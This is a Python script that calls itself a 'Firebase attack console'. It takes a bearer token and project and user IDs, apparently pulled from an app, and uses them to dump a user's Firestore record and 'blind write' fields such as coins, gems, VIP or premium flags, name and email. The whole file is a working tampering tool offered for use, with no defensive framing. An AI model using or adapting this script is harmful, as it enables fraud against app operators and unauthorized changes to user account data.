import requests
import json
import sys

# ================= CONFIGURATION =================
# FILL THESE IN USING INFO FROM PHASE 1 & 2
TOKEN = "PASTE_TOKEN_HERE"
PROJECT_ID = "PASTE_PROJECT_ID_FROM_DECODER"
USER_ID = "PASTE_USER_ID_FROM_DECODER"
# =================================================

BASE_URL = f"https://firestore.googleapis.com/v1/projects/{PROJECT_ID}/databases/(default)/documents"
HEADERS = {
    "Authorization": f"Bearer {TOKEN}",
    "Content-Type": "application/json"
}

def view_data():
    print(f"\n[*] Scanning Database for {USER_ID}...")
    url = f"{BASE_URL}/users/{USER_ID}"
    resp = requests.get(url, headers=HEADERS)
    
    if resp.status_code == 200:
        data = resp.json()
        print("\n[+] DATA DUMP:")
        print(json.dumps(data, indent=2))
        return data
    elif resp.status_code == 403:
        print("\n🔒 PERMISSION DENIED (403).")
        print("   The Security Rules are active. You cannot read this data.")
        print("   Try 'Blind Write' option if you know the field names.")
    else:
        print(f"[-] Error {resp.status_code}: {resp.text}")

def blind_write(field, value, type_label):
    print(f"\n[*] Attempting Blind Write: {field} -> {value}...")
    url = f"{BASE_URL}/users/{USER_ID}?updateMask.fieldPaths={field}"
    
    # Construct payload
    body = {"fields": { field: { type_label: value } }}
    
    resp = requests.patch(url, headers=HEADERS, json=body)
    
    if resp.status_code == 200:
        print("✅ SUCCESS! Value updated.")
        print("   Restart the app to see changes.")
    elif resp.status_code == 403:
        print("❌ FAILED: Security Rules prevented this write.")
    else:
        print(f"❌ FAILED: {resp.text}")

# --- MENU ---
while True:
    print("\n--- FIREBASE ATTACK CONSOLE ---")
    print("1. View Profile (Recon)")
    print("2. Modify Integer (Coins, Gems)")
    print("3. Modify Boolean (VIP, Premium)")
    print("4. Modify String (Name, Email)")
    print("5. Exit")
    
    choice = input("Select: ")
    
    if choice == '1':
        view_data()
    elif choice == '2':
        f = input("Field Name (e.g. coins): ")
        v = input("New Value: ")
        blind_write(f, str(v), "integerValue")
    elif choice == '3':
        f = input("Field Name (e.g. is_vip): ")
        v = input("Value (true/false): ").lower()
        bool_v = True if v == 'true' else False
        blind_write(f, bool_v, "booleanValue")
    elif choice == '4':
        f = input("Field Name (e.g. username): ")
        v = input("New Value: ")
        blind_write(f, str(v), "stringValue")
    elif choice == '5':
        sys.exit()
